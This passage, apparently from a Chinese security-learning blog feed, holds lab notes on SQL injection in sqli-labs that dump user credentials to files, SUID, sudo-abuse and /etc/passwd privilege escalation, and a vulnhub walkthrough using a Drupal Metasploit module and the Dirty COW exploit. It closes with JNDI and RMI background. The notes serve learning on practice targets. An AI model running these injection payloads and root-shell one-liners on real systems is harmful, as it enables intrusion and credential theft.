class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27;)) union select 1,2,3 into outfile &quot;C:\\phpstudy\\WWW\\sqli-labs-master\\Less-7\\1.txt&quot; --+</span><br><span class="line">报错，发现文件也并没有生成，检查一下环境</span><br><span class="line">进入mysql使用show variables like &quot;%security%&quot;命令</span><br></pre></td></tr></table></figure><p><img src="image-20230406145943107.png" alt="image-20230406145943107"></p><p>如果如上图显示secure_file_priv 为NULL证明此时没有导出文件的权限<br>我们在MYSQL文件下的my.ini中加入一句话secure_file_priv=&quot;/&quot;意思为可以将文件导入到任意目录此时重启mysql服务<br>我们再次使用show variables like &quot;%security%&quot;命令查看这时候只要不是NULL就可以了</p><p><img src="image-20230406220332745.png" alt="image-20230406220332745"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27;)) union select 1,2,3 into outfile &quot;C:\\phpstudy\\WWW\\sqli-labs-master\\Less-7\\1.txt&quot; --+</span><br><span class="line">报错，但是我们可以发现后台已经出现了1.txt了</span><br></pre></td></tr></table></figure><p><img src="image-20230406220448842.png" alt="image-20230406220448842"></p><p>后面就是常规的注入流程了，下面走一下流程（记住一步都要把上一步的文件删了，或是换个文件名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27;)) union select 1,2,database() into outfile &quot;C:\\phpstudy\\WWW\\sqli-labs-master\\Less-7\\1.txt&quot; --+</span><br><span class="line">爆破数据库名</span><br></pre></td></tr></table></figure><p><img src="image-20230406221036182.png" alt="image-20230406221036182"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27;)) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot; into outfile &quot;C:\\phpstudy\\WWW\\sqli-labs-master\\Less-7\\2.txt&quot; --+</span><br><span class="line">爆破表名</span><br></pre></td></tr></table></figure><p><img src="image-20230406221254777.png" alt="image-20230406221254777"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27;)) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; into outfile &quot;C:\\phpstudy\\WWW\\sqli-labs-master\\Less-7\\3.txt&quot; --+</span><br><span class="line">爆破字段名</span><br></pre></td></tr></table></figure><p><img src="image-20230406221427674.png" alt="image-20230406221427674"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：?id=-1&#x27;)) union select 1,2,group_concat(username,0x7e,password) from users into outfile &quot;C:\\phpstudy\\WWW\\sqli-labs-master\\Less-7\\4.txt&quot; --+</span><br><span class="line">爆破用户名密码</span><br></pre></td></tr></table></figure><p><img src="image-20230406221528300.png" alt="image-20230406221528300"></p><h3 id="第二种方法：结合一句话木马">第二种方法：结合一句话木马</h3><p>直接上传一句话木马，使用菜刀或者蚁剑进行连接，如图</p><p><img src="image-20230406225919437.png" alt="image-20230406225919437"></p><p>上传成功</p><p><img src="image-20230406225937428.png" alt="image-20230406225937428"></p><p>使用蚁剑连接</p><p><img src="image-20230406230000165.png" alt="image-20230406230000165"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUID提权</title>
      <link href="/2023/03/21/SUID%E6%8F%90%E6%9D%83/"/>
      <url>/2023/03/21/SUID%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>接上文sudo滥用提权，今天我们来学习suid提权</p><h2 id="SUID">SUID</h2><p>suid是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行</p><p>这里就不得不再提一次关于Linux文件权限的理解：</p><blockquote><p>​Linux中每个文件和目录都有九位基础权限位，每三位组成一组分别为：<strong>文件类型，属主用户权限位，用户组权限位，其它用户权限</strong></p><p>类似这样：d<strong>rwxrwxrwx</strong>（加粗部分，第一位d为目录文件），其中</p><p>r为可读权限，对应数字4</p><p>w为可写权限，对应数字2</p><p>x为可执行权限，对应数字1</p><p>若没有以上权限则可用-代替，对应数字0</p><p>接下来就是我们今天要讲的suid位，当s出现在属主权限位的x权限位上时，就被称为Set UID 简称SUID</p><p>suid s对应数字4</p></blockquote><p>s出现在属主权限x位上的作用：</p><blockquote><p>1.SUID权限仅对二进制程序有效</p><p>2.执行者对于该文件需要有x（运行）权限</p><p>3.本权限仅在程序运行过程中有效</p><p>4.执行者将拥有文件所有者的权限</p></blockquote><p>所以SUID提权的思路就是我们运行root用户所拥有的文件，那么我们运行该文件的时候就拥有root权限了，有点相似sudo滥用提权，都是利用拥有root权限的命令/程序，运行相应的最后获取root权限。下面进行环境的搭建</p><h2 id="环境搭建">环境搭建</h2><p>现在我们就来复现一下使文件变为具有root权限的suid的文件，首先编辑一个test.c</p><p><img src="image-20230323215718909.png" alt="image-20230323215718909"></p><p><img src="image-20230323221433451.png" alt="image-20230323221433451"></p><p>使用命令<code>gcc test.c -o 1</code>编译一下，编译为文件1</p><p><img src="image-20230323215817143.png" alt="image-20230323215817143"></p><p>设置文件的suid，注意这里要执行用户需要拥有运行权限，也就是其他用户权限要有x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -la //查看文件权限</span><br><span class="line">chmod 4775 1//4给文件1增添suid</span><br></pre></td></tr></table></figure><p>再次查看文件权限发现文件名已经变红了</p><p><img src="image-20230323220030036.png" alt="image-20230323220030036"></p><p>可以使用以下命令查看具有SUID权限的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><ul><li><code>find</code>: 在文件系统中查找文件和目录。</li><li><code>/</code>: 搜索的起始目录是根目录。</li><li><code>-perm</code>: 权限匹配选项，用于指定要搜索的文件权限。</li><li><code>-u=s</code>: 表示要搜索的权限是用户的 SetUID 权限，即文件所有者的权限。</li><li><code>-type f</code>: 指定要搜索的对象是文件（不包括目录）。</li><li><code>2&gt;/dev/null</code>: 将标准错误输出重定向到 /dev/null，这样可以忽略权限不足或找不到文件的错误信息。</li></ul><p><img src="image-20230323220653196.png" alt="image-20230323220653196"></p><p>可以看到/tmp/1就在其中</p><p><img src="image-20230323220708357.png" alt="image-20230323220708357"></p><p>使用非root用户，运行1，发现<code>cat /etc/shadow</code>运行成功，说明此时1运行时就是root权限，接下来就是提权的利用</p><h2 id="提权的利用">提权的利用</h2><p>已知的可以用来提权的linux可行性文件列表如下：</p><blockquote><ul><li>Nmap</li><li>Vim</li><li>find</li><li>Bash</li><li>More</li><li>Less</li><li>Nano</li><li>cp</li></ul></blockquote><h3 id="find">find</h3><p>就先拿find来说</p><p>先将find增加SUID权限，原本为755权限，现在改为4755,使用命令<code>chmod 4755 /bin/find</code></p><p><img src="image-20230323232843890.png" alt="image-20230323232843890"></p><p>当find文件拥有SUID权限时，通过find执行的所有命令都会以root权限执行如下：</p><p>使用非root用户执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find 1 -exec whoami \;</span><br></pre></td></tr></table></figure><p>未拥有SUID权限时：</p><p><img src="image-20230323233811760.png" alt="image-20230323233811760"></p><p>拥有SUID权限时：</p><p><img src="image-20230323233647653.png" alt="image-20230323233647653"></p><h3 id=""></h3><h3 id="vim">vim</h3><p>这次我们用另一种方式给vim命令赋予权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s /usr/bin/vim </span><br></pre></td></tr></table></figure><p>依然可以用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>来查看是否已经拥有SUID权限</p><p>这里是将vim复制为了.vim</p><p><img src="image-20240507105836401.png" alt="image-20240507105836401"></p><p>此时切换非root用户时，使用.vim命令新建一个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/.vim wbszs.txt</span><br></pre></td></tr></table></figure><p>然后使用<code>ls -l wbszs.txt</code> 查看权限</p><p><img src="image-20240507111829692.png" alt="image-20240507111829692"></p><p>可以看到此时已经拥有了 root权限，因此可以使用修改后的vim对/etc/passwd或/etc/shadow等敏感文件进行修改</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用passwd提权</title>
      <link href="/2023/03/11/%E5%88%A9%E7%94%A8passwd%E6%8F%90%E6%9D%83/"/>
      <url>/2023/03/11/%E5%88%A9%E7%94%A8passwd%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>初步整理完关于sudo滥用提权，开始整理一下关于配置错误/etc/passwd的利用</p><p>sudo滥用和这篇文章都参考这个大佬的：<a href="https://blog.csdn.net/qq_44159028/article/details/123684723"> Linux提权方法总结_linux如何提权_山山而川’的博客-CSDN博客</a></p><h2 id="1-先决条件及环境搭建">1.先决条件及环境搭建</h2><p>要当前用户对/etc/passwd文件具有写的权限，找个靶机实验一下</p><p>ls -l /etc/passwd查看一下当前权限，说明已经修改为所有用户都具有w即写的权限</p><p><img src="image-20230311205425210.png" alt="image-20230311205425210"></p><hr><p>接下来我们就看一下/etc/passwd中所表示的信息,以下面的语句为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>root为<strong>登录用户名</strong> x为<strong>密码</strong>（加过密的） 0为<strong>用户UID</strong> 0为<strong>用户组id GID</strong> root为<strong>用户备注信息</strong>  /root为<strong>用户home目录</strong> /bin/bash<strong>用户默认的bash</strong></p><hr><p>因此我们需要的就是对/etc/passwd进行写入</p><p>我们要构造一个用户，密码为我们设定的密码（带盐值），并且UID设置为0</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -le &#x27;print crypt(&quot;123456&quot;,&quot;addsalt&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>命令生成带盐值的密码（123456）：<code>adrla7IBSfTZQ</code></p><p><img src="image-20230311204947405.png" alt="image-20230311204947405"></p><h2 id="2-复现及利用">2.复现及利用</h2><p>好了，现在环境就已经复现好了，现在我们要换回一个低权限用户，此用户对/etc/passwd有写权限，并拥有一个带盐值的密码<code>adrla7IBSfTZQ</code>，万事俱备，直接开始利用</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test:adrla7IBSfTZQ:0:0:root:/root:/bin/bash&quot;</span><br></pre></td></tr></table></figure><p>将<code>test:adrla7IBSfTZQ:0:0:root:/root:/bin/bash</code>加入/etc/passwd(!!注意是追加&gt;&gt;不是覆盖&gt;)</p><p><img src="image-20230311210056491.png" alt="image-20230311210056491"></p><p>查看新加入内容</p><p><img src="image-20230311210422730.png" alt="image-20230311210422730"></p><p><img src="image-20230311210458196.png" alt="image-20230311210458196"></p><p>添加成功，切换用户</p><p><img src="image-20230311210555606.png" alt="image-20230311210555606"></p><p>提权成功！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sudo滥用提权</title>
      <link href="/2023/03/05/sudo%E6%BB%A5%E7%94%A8%E6%8F%90%E6%9D%83/"/>
      <url>/2023/03/05/sudo%E6%BB%A5%E7%94%A8%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>上次复现并学习了脏牛提权，这次再整理一下sudo滥用提权的相关内容</p><h2 id="关于sudo">关于sudo</h2><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的工具如halt，reboot，su等等。</p><p>要想使一个用户具有使用sudo的能力，需要root用户将其名字，所能执行的命令，按照哪种用户或用户组的身份执行等信息注册到<code>/etc/sudoers</code>中</p><h2 id="关于sudoers">关于sudoers</h2><blockquote><p>sudoers文件主要有三部分组成：</p><p>sudoers的默认配置（default） 主要设置sudo的一些缺省值</p><p>alias（别名），主要有Host_Alias|Runas_Alias|User_Alias|Dmnd_Alias</p><p>安全策略（规则定义）</p></blockquote><h3 id="语法：">语法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root ALL=(ALL) ALL</span><br></pre></td></tr></table></figure><p>解释：root用户可以从 ALL（任意）终端作为ALL（任意）用户执行ALL（任意）命令</p><p>即 <strong>用户 终端 可充当的用户 使用时可以运行的命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root ALL=(ALL:ALL) ALL</span><br><span class="line">hacker ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><p>解释：root这一句与上面不同的就是root用户可以从 ALL（任意）终端作为ALL（任意）用户，ALL（任意）组执行ALL（任意）命令</p><p>hacker同上，因此此时的hacker就相当于root用户了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker ALL=(root) NOPASSWD: /usr/bin/awk</span><br></pre></td></tr></table></figure><p>解释：hacker用户可以从 ALL（任意）终端作为root用户<strong>无密码</strong>执行awk命令</p><h3 id="查看用户能以root权限运行的命令">查看用户能以root权限运行的命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><h2 id="sudo提权命令">sudo提权命令</h2><blockquote><p>wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp、ed、screen</p></blockquote><p>就先到这里，以后具体的例子会单独找案例进行分析</p><hr><p>更新，这里直接搭建一个环境，把常见的总结一下吧，后面遇到了再继续补充</p><h2 id="复现与总结">复现与总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/awk</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/vim</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/man</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/apache2</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/less</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /bin/more</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/find</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/zip</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/git</span><br></pre></td></tr></table></figure><h3 id="搭建环境">搭建环境</h3><p>首先新建一个用户hacker，<code>vim /etc/sudoers</code>并在/etc/sudoers中加入以上的代码</p><p><img src="image-20230308201152439.png" alt="image-20230308201152439"></p><p>先给靶机上的hacker用户修改个密码 <code>passwd hacker</code></p><p><img src="image-20230308201402730.png" alt="image-20230308201402730"></p><p><code>su hacker</code>输入密码，切换成hacker，这就复现出我们一个刚刚进到一个新的系统中的情形，只有一个普通用户，然后我们需要提权</p><p><img src="image-20230308201639147.png" alt="image-20230308201639147"></p><p><code>sudo -l</code>查看允许当前用户使用的命令，这里我们主要寻找能以root权限执行的命令，如下图，那么，下面我们就一个一个来实践进行提权</p><p><img src="image-20230308201901240.png" alt="image-20230308201901240"></p><h3 id="awk">awk</h3><p>awk的相应提权方法为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="image-20230308202438207.png" alt="image-20230308202438207"></p><p>提权成功！</p><h3 id="find">find</h3><p>find的相应提权命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /home -exec /bin/bash \;</span><br></pre></td></tr></table></figure><p><img src="image-20230308202802004.png" alt="image-20230308202802004"></p><p>提权成功！</p><h3 id="cat">cat</h3><p>cat比较麻烦一点，我们可以使用cat查看文件/etc/shadow找到加密后的用户名密码，之后再用john破解</p><p>演示：1.使用<code>sudo cat /etc/shadow &gt;&gt; 1.txt</code> 读取shadow文件到1.txt中</p><!--(上面我们写入sudoers文件时没有写入`hacker  ALL=(root) NOPASSWD: /usr/bin/cat` 这一条，因此要实现cat的引用需要加上这一条，也就是实战时需要满足这个条件)--><p><img src="image-20230308231813556.png" alt="image-20230308231813556"></p><p><code>sudo cat /etc/passwd &gt;&gt; 2.txt</code> 读取passwd文件到2.txt</p><p><img src="image-20230308232938552.png" alt="image-20230308232938552"></p><p>使用<code>unshadow 2.txt 1.txt &gt;&gt; passwd.txt</code>将两个文件整合到一起为passwd.txt</p><p><img src="image-20230308233126463.png" alt="image-20230308233126463"></p><blockquote><p>关于unshadow的使用：<img src="image-20230308233157219.png" alt="image-20230308233157219"></p></blockquote><pre><code>2.使用john破解密码：</code></pre><p>这里实现的时候有些问题，有时候快有时候慢，等解决了再过来补充</p><h3 id="zip">zip</h3><p>这里就是解压缩命令zip了，首先安装zip命令<code>apt install zip</code></p><p><img src="image-20230311191243971.png" alt="image-20230311191243971"></p><p>有就不用了</p><p>使用<code>touch 2.txt</code> 创建一个2.txt,并使用<code>zip 1.zip 2.txt</code> 生成一个1.zip</p><p><img src="image-20230311192448941.png" alt=""></p><p><img src="image-20230311192546415.png" alt="image-20230311192546415"></p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo 1.zip 2.txt -T --unzip-command=&quot;sh -c /bin/bash&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20230311192656025.png" alt="image-20230311192656025"></p><p>提权成功</p><h3 id="git">git</h3><p>git就比较简单了首先使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git help add</span><br></pre></td></tr></table></figure><p><img src="image-20230311193259077.png" alt="image-20230311193259077"></p><p>命令，进入到该页面</p><p><img src="image-20230311193608707.png" alt="image-20230311193608707"></p><p>在此处输入<code>!/bin/bash</code></p><p><img src="image-20230311193703440.png" alt="image-20230311193703440"></p><p><img src="image-20230311193718807.png" alt="image-20230311193718807"></p><p>提权成功</p><h3 id="ed">ed</h3><p>安装ed</p><p><img src="image-20230311194608383.png" alt="image-20230311194608383"></p><p>在sudoers中加入ed，这就不多说了</p><p><img src="image-20230311194824177.png" alt="image-20230311194824177"></p><p>更简单<code>sudo ed</code> 并输入<code>!/bin/bash</code></p><p><img src="image-20230311195050568.png" alt="image-20230311195050568"></p><p><img src="image-20230311195101783.png" alt="image-20230311195101783"></p><p>运行</p><p><img src="image-20230311195113341.png" alt="image-20230311195113341"></p><p>提权成功！</p><p>未完待续……</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』脏牛提权</title>
      <link href="/2023/03/03/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8F%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/"/>
      <url>/2023/03/03/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8F%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>复习Linux提权的相关知识，学到脏牛提权，正好有个vulnhub靶机可以用来练手，一起来试一下！</p><h2 id="环境搭建">环境搭建</h2><p>靶机下载：<a href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampião: 1 ~ VulnHub</a></p><p><img src="image-20230303164501489.png" alt="image-20230303164501489"></p><p>使用Vmware打开靶机：</p><p><img src="image-20230303152316746.png" alt="image-20230303152316746"></p><p>看来需要密码，先进行<strong>信息搜集</strong></p><h2 id="信息搜集">信息搜集</h2><p>使用<code>nmap -sn xxx.0/24</code>查找同一网段的主机，-sn是只扫描主机不扫描端口的意思</p><p><img src="image-20230303152951578.png" alt="image-20230303152951578"></p><p>找到一个可疑IP192.168.117.126使用<code>nmap -p- xxx</code>扫描对应IP的端口，发现有22 ,80,1898三个端口</p><p><img src="image-20230303153743782.png" alt="image-20230303153743782"></p><p>是同浏览器访问1898端口得到以下界面</p><p><img src="image-20230303154008098.png" alt="image-20230303154008098"></p><p>发现使用框架Drupal</p><p><img src="image-20230303154049475.png" alt="image-20230303154049475"></p><p>使用dirsearch -u [url]来进行敏感了目录扫描（当时没有仔细看敏感目录有什么，直接去找Drupal的漏洞去了）</p><p><img src="image-20230303154251965.png" alt="image-20230303154251965"></p><p>使用<code>msfconsole</code>打开metasploit</p><p><img src="image-20230303155216108.png" alt="image-20230303155216108"></p><p>在CHANGELOG.txt中发现Drupal的版本为7.54 更新时间为2017年</p><p><img src="image-20230303155511560.png" alt="image-20230303155511560"></p><p>直接在msf中使用<code>search Drupal</code>命令搜索相关的漏洞，有一个18年的就用它了</p><p><img src="image-20230303155612179.png" alt="image-20230303155612179"></p><h2 id="漏洞利用">漏洞利用</h2><p>使用<code>use 1</code>进行漏洞利用，<code>show options</code>查看需要的配置</p><p><img src="image-20230303155947519.png" alt="image-20230303155947519"></p><p><img src="image-20230303160002709.png" alt="image-20230303160002709"></p><p>只需要设置RHOST和RPORT即可，即目的ip和目的端口</p><p><img src="image-20230303160242289.png" alt="image-20230303160242289"></p><p>设置后，使用<code>run</code>命令进行漏洞利用，得到一个www-data的普通用户的权限，这里总结一下刚刚漏洞利用过程的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.use 1 //search到的漏洞编号</span><br><span class="line">2.show options //查看配置</span><br><span class="line">3.set RHOST xxx //设置目的ip</span><br><span class="line">4.set RPORT xxx //设置目的端口</span><br><span class="line">5.run //漏洞利用</span><br></pre></td></tr></table></figure><p><img src="image-20230303160219694.png" alt="image-20230303160219694"></p><p>成功获取shell并使用python一句话反弹交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="image-20230303160731092.png" alt="image-20230303160731092"></p><h2 id="Linux提权——脏牛提权">Linux提权——脏牛提权</h2><p>使用uname -a查看Linux内核版本：4.4.0-31-generic</p><p>漏洞描述：</p><blockquote><p>漏洞编号：CVE-2016-5195<br>漏洞名称：脏牛（Dirty COW）<br>漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权<br>影响范围：Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。</p></blockquote><p>主流发行版修复之后的内核版本，如果你的内核版本低于列表里的版本，表示还存在脏牛漏洞。</p><blockquote><p>Centos7 /RHEL7     3.10.0-327.36.3.el7</p><p>Cetnos6/RHEL6     2.6.32-642.6.2.el6</p><p>Ubuntu 16.10      4.8.0-26.28</p><p>Ubuntu 16.04     4.4.0-45.66</p><p>Ubuntu 14.04     3.13.0-100.147</p><p>Debian 8       3.16.36-1+deb8u2</p><p>Debian 7         3.2.82-1</p></blockquote><p><img src="image-20230303160834221.png" alt="image-20230303160834221"></p><p>可以看到我们此时的靶机属于Ubuntu 14.04     3.13.0-100.147这一范围因此，可以使用脏牛提权</p><p>使用命令searchsploit dirty找到40847.cpp的位置，我们要使用的脚本就在这里了</p><p><img src="image-20230303161628487.png" alt="image-20230303161628487"></p><p>将其复制到当前用户目录下，注意searchsploit搜到的脚本，都在<code>/usr/share/exploitdb/exploits</code>中后面再加上Path中的路径即可</p><p><img src="image-20230303162005823.png" alt="image-20230303162005823"></p><p>使用<code>python3 -m http.server 80</code>命令在80端口开启http</p><p><img src="image-20230303162057865.png" alt="image-20230303162057865"></p><p>进入到tmp目录下使用<code>wget http://xxx:80/40847.cpp</code>将脚本下载到靶机（ps：使用tmp目录的原因是，一般tmp目录具有写入权限，使用时找一个具有写入权限的目录进行下载即可）</p><p><img src="image-20230303162504106.png" alt="image-20230303162504106"></p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 1 40847.cpp -lutil //1的意思为编译后的执行文件名，可自定义</span><br></pre></td></tr></table></figure><p>命令进行编译</p><p><img src="image-20230303163841025.png" alt="image-20230303163841025"></p><p>编译成功，使用<code>./1 -s</code>命令运行执行文件1，得到root权限</p><p><img src="image-20230303163913985.png" alt="image-20230303163913985"></p><p><code>cat flag.txt</code> 得到flag</p><p><img src="image-20230303164000917.png" alt="image-20230303164000917"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI注入重置版</title>
      <link href="/2023/02/23/JNDI%E6%B3%A8%E5%85%A5%E9%87%8D%E7%BD%AE%E7%89%88/"/>
      <url>/2023/02/23/JNDI%E6%B3%A8%E5%85%A5%E9%87%8D%E7%BD%AE%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p>大概理解了RMI的原理，现在开始重新学习一下JNDI注入</p><h2 id="一、JNDI机制与原理">一、JNDI机制与原理</h2><p>名称：JNDI(Java Naming and Directory Interface,Java命名和目录接口)</p><p>概述：JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的<strong>一种标准的Java命名系统接口</strong>，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些<strong>命名服务和目录服务之间</strong>进行交互。目录服务是命名服务的一种自然扩展。</p><p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p><blockquote><p>javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类； javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；<br>javax.naming.event：在命名目录服务器中请求事件通知；<br>javax.naming.ldap：提供LDAP支持；<br>javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</p></blockquote><p>至于使用方法，在将RMI中已经体现过了,其实在介绍RMI的时候我们就已经利用了JNDI，那么可以知道，当lookup()中参数可控的时候，我们就可以引入恶意代码</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java RMI</title>
      <link href="/2023/02/14/Java-RMI/"/>
      <url>/2023/02/14/Java-RMI/</url>
      
        <content type="html"><![CDATA[<p>先前介绍过RMI但感觉不够详细所，理解也不够透彻，想着这次再学习一下，当然，此篇文章仅供个人理解，因此会借鉴大神们的文章，文末会有标出。</p><h2 id="一、Java-RMI机制与原理">一、Java RMI机制与原理</h2><p>RMI（Remote Method invocation）远程方法调用：是允许在一个JAVA虚拟机中运行的<strong>对象</strong>调用运行在另一个JAVA虚拟机中的<strong>对象</strong>的方法</p><p><em>（ps：两个虚拟机可以是运行在<strong>相同计算机</strong>的不同<strong>进程</strong>中，也可以是运行在网络上的<strong>不同计算机</strong>中）</em></p><p>而JAVA RMI：用于实现远程过程调用的应用程序编程接口。它使客户机上的程序可以调用远程服务器上的对象的引用</p><!--宗旨：简化远程接口对象的使用--><h3 id="RMI过程：">RMI过程：</h3><p>服务器调用远程注册表将名称与远程对象关联</p><p>客户端在注册表中通过<strong>名称</strong>查找远程对象，然后在其上调用一个方法</p><p>要了解RMI就不得不提到两个概念</p><h3 id="Stub和Skeleton">Stub和Skeleton</h3><p>rmi框架使用代理来负责代理与远程对象通过socket进行通信的细节</p><p>客户端代理stub（存根）服务器代理skeleton（骨架）</p><h3 id="RMI远程调用步骤：">RMI远程调用步骤：</h3><p>1.客户调用方法</p><p>2.经过stub代理打包（编码）调用信息（变量，方法名）通过网络发给skeleton</p><p>3.服务器端通过skeleton解包，找出被调用的方法以及方法所在的对象</p><p>4.服务器端调用真正的方法，将返回结果发给skeleton</p><p>5.skeleton打包返回结果，通过网络发送给stub</p><p>6.stub解包，得到返回结果，返回给调用者</p><p>7.客户端收到返回值</p><h2 id="二、JAVA-RMI示例">二、JAVA RMI示例</h2><p>创建RMI的步骤</p><p>1.创建远程接口</p><p>2.创建远程类</p><p>3.创建服务器程序</p><p>4.创建客户端程序</p><p>下面进行详细分析：</p><h3 